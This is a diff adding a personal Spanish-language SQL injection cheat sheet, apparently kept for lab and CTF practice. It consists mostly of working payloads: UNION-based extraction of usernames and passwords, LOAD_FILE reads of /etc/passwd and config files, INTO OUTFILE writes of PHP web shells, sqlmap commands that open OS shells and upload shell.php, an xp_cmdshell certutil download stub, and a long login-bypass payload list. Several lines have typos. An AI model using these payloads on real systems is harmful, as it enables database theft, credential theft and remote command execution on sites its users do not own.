@@ -1,0 +1,450 @@
+https://www.absolomb.com/2018-05-04-HackTheBox-Tally/
+
+tarlogic-com/blog/red-ream-tales-0x01
+
+';EXEC xp_cmdshell 'certutil -urlcache -f http' ; --
+
+https://resources.infosecinstitute.com/sql-truncation-attack/#gref
+
+https://websec.ca/kb/sql_injection
+
+https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/
+
+sqlmap -u ip --crawl=1
+--os-shell PARA VER RUTAS
+
+https://dev.to/caffiendkitten/hacker101-ctf-photo-gallery-4foi
+
+sqlmap -r facebook-request.txt --force-ssl --level 5 --risk 3 -p email --dbms="MySQL" --test-filter="OR boolean-based blind - WHERE or HAVING clause (NOT)"
+
+401
+sqlmap -u $url --forms --crawl=2 --dbs --ignore-code=401
+
+-----------------------------------
+UNION SELECT
+ID=738'
+738 order by 1
+738 order by 2
+asi se las tablas en este caso 7
+-----------------------------
+738 union all select 1,2,3,4,5,6
+738 union all select 1,2,3,4,@@version,6
+738 union all select 1,2,3,4,user(),6
+738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
+738 union all select 1,2,3,4,table_name,6 FROM information_schema.columns where table_name='users'
+738 union all select 1,2,3,4,concat(name,0x3a,password),6 FROM users
+738 union all select 1,2,3,4,<??php echo shell_exec($_GET['cmd']);?>", 6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+
+Tipos--
+------------------
+--SQL basado en errores (INSERT -- UPDATE -- DELETE --UNION) 
+--BLIND SQLI
+--ARITHMETIC BLIND SQL
+----------------------
+----------------------
+SOFTWARE--
+----------------------
+BSQL HACKER
+SQLMAP
+SQLNINJA
+MOLE
+SQLSUS
+sql power injector
+----------------------
+-------------------------------------------------------------------------------------
+TECNICAS // link
+--------
+' order by 1#
+' and union select 1,2,3,4,5,6,7#
+' and union select 1,2,3,4,@@version,6,7#
+' and union select 1,2,3,4,group_concat(table_name),6,7 from information_schema.tables where table_schema=database()#
+-1+union+select+1,2,3,group_concat(username,':',password),from users#
+1+order+by+6-- IR INCREMENTANDO HASTA QUE DE UN ERROR ,,ENTONCES SERA UNO MENOS 5
+-1+union+select+1,2,3,4,5--+
+-1+union+select+1,2,table_name,5+from+information_schema.tables--
+-1+union+select+1,2,3,table_name,5+from+information_schema.tables+limit+2,1--
+-1+union+select+1,2,3,table_name,5+from+information_schema.tables+limit+$3$,1--
+meterlo al intruder y quitarle el intercep
+PAYLOADS
+NUMBERS
+-1+union+select+1,2,3,group_concat(column_name),5+from+information_schema.columns+where+table_name=sqli--
+pasar sql en codifo acsi
+-1+union+select+1,2,3,group_concat(column_name),5+from+information_schema.columns+where+table_name=4343436--
+-1+union+select+1,2,3,concat(user,0x3a,pass),5+from+sqli---
+--------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------
+ejercicio
+http://192.168.0.105/vulnerabilities/sqli/?id=1%27%20order%20by%201,2--+&Submit=Submit#
+1' order by 1,2--+
+1' union select 1,2--+
+1' union select database(),version()--+
+1' union select 1,table_name from information_schema.tables--+
+1' union select 1,column_name from information_schema.columns where table_name=--+
+cryptii.com
+users
+1' union select 1,column_name from information_schema.columns where table_name=char(113,123,2332,123,32)--+
+1' union select user,password from users--+
+SQLMAP
+
+------
+--forms
+--batch
+crawl=1010
+--level=5
+--risk=3
+ejemplos
+example1.php?name=root"
+sqlmap -u --forms --batch --crewl=1 --level=5 --risk=3
+-D -T -C
+SQLMAP -u .php?name=root" --dbs
+dump
+--os-shell
+sqlmap -u --tables -D exercises ((no hace falta poner la db otra vez))
+name=-1 union selecct 1,2
+SQLSUS
+sqlsus -g attack
+nano attack  ((y poner la ip))
+sqlsus attack
+start
+get columns []
+get
+------------------------------------------------------------------------------
+------------------------------------------------------------------------------
+FORMULARIO-------------------
+-----------------------------
+%' or 0=0 union select null, version() #    en el formulario para ver la version
+
+%' or 0=0 union select null, user() #       para ver el usuario de la db
+
+%' or 0=0 union select null, database() # 
+$
+%' and 1=0 union select null, table_name from information_schema.tables #
+
+%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+Información de todas las tablas que tengan prefijo "User"
+%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+------------------------------
+------------------------------
+Nivel Medio
+-----------------------------
+Modiciar el parametro id=1 en burpsuite
+ir añadiendo
+1 and 1=0 union select null, table_name from information_schema.tables #
+1 or 1=0 union select files  # 
+1' or 1=1 union select null, user() #  
+1 and 1=0 union select user, password from users#
+----
+----
+SQL Injection
+-------
+SQL INJECTION EN ERRORES INJECTANDO ...ES LO ANTERIOR
+BLIND SQL NOM UESTRA EL ERROR--PAGINA GENERICA--IMPLICA MUCHO TIEMPO
+------------
+--------------
+-----------------
+BLIND SQL INJECTION  (((SQLMAP)))
+-------------------
+USER=1 & 1=1
+---------------------
+BLING SQL TIMING
+--5 SEGUNDOS SI ES CORRECTA
+--10 SEGUNDOS SI ES INCORRECTA
+
+-------------------------------
+bling sql injection arithmetic  (((A TRAVES DE FUNCIONES MATEMATICAS)))
+-------------------------------
+---------------------------------
+wronguser' or 1=1 LIMIT 1;#
+1234
+1 or 1=1
+'or'1'='1
+'or''1'='1'
+1' or'1'='1
+'OR'1'='1
+' OR 1=1/*
+' OR '1'='1' --
+' OR '1'='1'1 ({
+" or "" "
+" or ""&"
+" or ""*"
+" or ""-"
+" or ""="
+" or ""^"
+" or "a"="a
+" or "x"="
+" or "x"="x
+" or 0=0 #
+" or 0=0 *
+" or 0=0 --
+" or 1 --
+" or true--
+"&"
+") or ("")=("
+") or ("a"="a
+") or ("x")=("
+") or ("x")=("x
+") or 1--
+") or true--
+")) or (("x"))=(("x
+"*"
+"-"
+"^"
+' '
+' OR '1=1
+' and 'one'='one
+' and 'one'='one--
+' or '' '
+' or ''&'
+' or ''*'
+' or ''-'
+' or ''^'
+' or '1'='1
+'or 'one'='one
+'or 'one'='one--
+' or 'x'='x
+' or 'x'='x--
+' or 0=0 #
+' or 0=0 *
+' or 0=0 --
+' or 1=1--
+' or a=a--
+' or true--
+'&'
+') OR ('1'-'1
+') OR ('a' = 'a
+') or ('')=('
+') or ('a'='a
+') or ('x')=('
+') or ('x')=('x
+') or ('x'='x
+') or --
+') or true--
+')) or ((''))=(('
+')) or (('x'))=(('
+')) or (('x'))=(('x
+')) or 1--
+')) or true--
+'*'
+'-'
+'^'
+'or''='
+'or'1=1'
+) or '1'='1--
+) or ('1'='1--
+1' having '1'='1'--
+1') and '1'='1--
+1'or’1'=’1==
+admin" #
+admin" --
+admin" or "1"="1
+admin" or "1"="1"#
+admin" or "1"="1"--
+admin" or "1"="1"/*
+admin" or 1=1
+admin" or 1=1#
+admin" or 1=1--
+admin" or 1=1/*
+admin") or "1"="1
+admin") or "1"="1"#
+admin") or "1"="1"--
+admin") or "1"="1"/*
+admin") or ("1"="1
+admin") or ("1"="1"#
+admin") or ("1"="1"--
+admin") or ("1"="1"/*
+admin"/*
+admin"or 1=1 or ""="
+admin' #
+admin' --
+admin' or '1'='1
+admin' or '1'='1'#
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or 1=1
+admin' or 1=1#
+admin' or 1=1--
+admin' or 1=1/*
+admin') or '1'='1
+admin') or '1'='1'#
+admin') or '1'='1'--
+admin') or '1'='1'/*
+admin') or ('1'='1
+admin') or ('1'='1'#
+admin') or ('1'='1'--
+admin') or ('1'='1'/*
+admin'--
+admin'/*
+admin'or 1=1 or ''='
+admin’–
+and 1=1
+and 1=1--
+foo'+OR+'1'='1
+hi" or "a"="a
+hi" or 1=1 --
+hi") or ("a"="a
+hi' or 'a'='a
+hi' or 1=1 --
+hi') or ('a'='a
+hi’ or 1=1 –
+hi’ or ‘a’='a
+hi’) or (‘a’='a
+hi” or 1=1 –
+hi” or “a”=”a
+hi”) or (“a”=”)
+or 0=0 #
+or 0=0 *
+or 0=0 -
+or 1=1
+or 1=1#
+or 1=1--
+or 1=1/*
+or 1=1–
+or a=a--
+or true--
+x' or 'x'='x
+‘ or 0=0 #
+‘ or 1=1 –
+‘ or 1=1–
+‘ or a=a–
+‘ or ‘x’='x
+‘) or (‘a’='a
+‘) or (‘x’='x
+“) or (“a”=”a
+” or 0=0 #
+” or 0=0 –
+” or 1=1–
+” or “a”=”a
+” or “x”=”x
+
+--------------
+ORDER BY
+1 order by 1
+1 order by 2,,,,
+asi hasta que aparezca un error
+pues es una menos
+--------------------
+-----------------------
+1 union all select 1,2,3,4,5,6
+
+1 union all select 1,2,3,4,@@version,6
+
+1 union all select 1,2,3,4,user(),6
+
+1 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
+
+1 union all select 1,2,3,4,table_name,6 FROM information_schema.columns where table_name='users'
+
+1 union all select 1,2,3,4,concat(name,0x3a,password),6 FROM users
+
+1 union all select 1,2,3,4,load_file(c:...),6 FROM users
+
+1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+
+https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b
+www.kutploit/2019/11/sql-injection-paylaod-list.html
+
+
+ENUMERAR LA CANTIDAD COLUMNAS
+
+id=1 ORDER BY 1-- 
+
+SI TE DA POR EJEMPLOI 5 Y DA ERROR
+ES QUE SOLO TIENE 4
+
+1 UNION SELECT 1,2,3,4 -- AHORA AL REVES SINO DA ERROR
+
+1 UNION SELECT 1,@@version,user(),4 --
+
+1 UNION SELECT 1,@@version,user(),4 --
+
+a veces hay que cambiar el 1 por otro cuando nose muestran los datos
+posiblemente porque hay que ponerlo en una columna vacia
+
+3 UNION SELECT 1,2,3,4 --
+NUMERO NETATIVO
+O NUMERO ALTO
+-1
+999999
+
+9999 UNION SELECT 1,@@version,user(),4--
+9999 UNION SELECT 1,database(),system_user(),4 --
+9999 UNION SELECT 1,2,LOAD_FILE('/etc/passwd'),4 --
+	                       ('/var/www/config.php')
+----------------------------------------------------
+cp cmd.php
+<?php echo system($_REQUEST['pt']); ?>
+
+9999 UNION SELECT 1,2"<?php echo($_REQUEST['pt'];?>",4 INTO OUTFILE "/var/www/planintext.php" --
+
+sino tenemos permisoss escanear
+-----------------------------------------------
+1 nombre base de datos
+2 nombre de la tabla
+3 nombre columnas
+4 dump
+9999 UNION SELECT 1,2,count(*),4 FROM INFORMATION_SCHEMA.SCHEMAT -- 
+
+9999 UNION SELECT 1,2,schema_name,4 FROM INFORMATION_SCHEMA.SCHEMAT -- 
+
+9999 UNION SELECT 1,2,schema_name,4 FROM INFORMATION_SCHEMA.SCHEMAT LIMIT 0,1--  1,1-- 2,1--
+
+9999 UNION SELECT 1,2,table_name,4 FROM INFORMATION_SCHEMA.tables WHERE table_schema='blog' --
+
+9999 UNION SELECT 1,2,table_name,4 FROM INFORMATION_SCHEMA.tables WHERE table_schema='blog' limit 0,1 --
+
+9999 UNION SELECT 1,2,table_name,4 FROM INFORMATION_SCHEMA.tables WHERE table_schema='blog' limit 1,1 --
+
+9999 UNION SELECT 1,2,table_name,4 FROM INFORMATION_SCHEMA.tables WHERE table_schema='blog' limit 2,1 --
+
+9999 UNION SELECT 1,2,count(*),4 FROM INFORMATION_SCHEMA.columns WHERE table_name= 'users' and table_schema=blog limit 2,1 --
+
+9999 UNION SELECT 1,2,column_name,4 FROM INFORMATION_SCHEMA.columns WHERE table_name= 'users' and table_schema=blog limit 2,1 --
+
+9999 UNION SELECT 1,2,concat(id," :: "logi " :: ",password),4 FROM users --
+
+https://medium.com/bugbountywriteup/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2
+load file
+
+VER RUTAS ESCRIBIBLES	
+
+sqlmap -r search_products.req --random-agent --dbms mysql --sql-shell
+--dbms mysql --privileges
+
+
+sqlmap --all -r nombre archivo  --batch --file-witre=shell.php --file-dest=/inetpub/wwwroot/shell.php,
+
+manual
+id=Prodada'; select "<?php echo shell_Exec($_GET['c']);?>" into OUTFILE 'c:\\';
+
+<?php echo system($_REQUEST["c"]); ?>
+
+/var/www/html/
+/xampp/
+\\xampp\htdocs\wordpress
+https://miposicionamientoweb.es/como-instalar-wordpress-local/
+select @@datadir;
+select @@hostname;
+version();
+SELECT load_file('C:\inetpub\wwwroot\index.php');
+SELECT '<?php echo phpinfo(); ?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\info.php';
+https://websec.ca/kb/sql_injection#MySQL_Default_Databases
+
+dentro de sql
+select "<?php system($_GET['cmd']);?>" into outfile '/var/tmp/raj.php';
+------------------
+load_file ('c: wqweqwew ') into outfile ''
+----------------------
+por mysql root
+select "<?php system($_GET['cmd']);?>" into outfile '/var/tmp/raj.php';
+
+en injecition seria
+union select 1,2,"<>",4,5,6,7 into outfile "/var/www/html/test.php";
+
+https://websec.ca/kb/sql_injection#MySQL_Default_Databases
+
+https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/
+
+
+
+
+
